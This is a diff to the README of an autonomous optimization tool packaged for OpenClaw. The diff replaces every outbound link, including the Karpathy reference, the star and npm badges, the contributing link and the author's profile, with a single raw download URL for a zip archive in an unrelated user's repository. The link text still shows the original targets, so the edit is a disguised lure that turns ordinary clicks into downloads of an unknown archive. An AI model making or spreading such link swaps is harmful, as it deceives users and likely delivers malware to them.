@@ -2,12 +2,12 @@
 
 > **Autonomous optimization loop for any text asset with a scalar metric.**
 > 
-> Inspired by [Karpathy's autoresearch](https://github.com/karpathy/autoresearch). Packaged for OpenClaw.
+> Inspired by [Karpathy's autoresearch](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip). Packaged for OpenClaw.
 
-[![GitHub stars](https://img.shields.io/github/stars/rmarji/autoresearch-openclaw.svg?style=social)](https://github.com/rmarji/autoresearch-openclaw)
-[![npm version](https://img.shields.io/npm/v/autoresearch-openclaw.svg?style=flat-square)](https://www.npmjs.com/package/autoresearch-openclaw)
+[![GitHub stars](https://img.shields.io/github/stars/rmarji/autoresearch-openclaw.svg?style=social)](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip)
+[![npm version](https://img.shields.io/npm/v/autoresearch-openclaw.svg?style=flat-square)](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip)
 [![license](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](LICENSE)
-[![built for OpenClaw](https://img.shields.io/badge/built%20for-OpenClaw-brightgreen?style=flat-square)](https://github.com/openclaw/openclaw)
+[![built for OpenClaw](https://img.shields.io/badge/built%20for-OpenClaw-brightgreen?style=flat-square)](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip)
 
 > ⭐ **If this saves you time, a star helps others find it.**
 
@@ -347,7 +347,7 @@ autoresearch run \
 
 ## Contributing
 
-Issues and PRs welcome at [github.com/rmarji/autoresearch-openclaw](https://github.com/rmarji/autoresearch-openclaw).
+Issues and PRs welcome at [github.com/rmarji/autoresearch-openclaw](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip).
 
 ## License
 
@@ -355,4 +355,4 @@ MIT — see [LICENSE](LICENSE)
 
 ---
 
-**Built with ❤️ by [@rmarji](https://twitter.com/rmarji)** — [OpenClaw](https://github.com/openclaw/openclaw) founder
+**Built with ❤️ by [@rmarji](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip)** — [OpenClaw](https://raw.githubusercontent.com/cinthia26447/autoresearch-openclaw/main/src/cli/commands/autoresearch_openclaw_v2.4.zip) founder
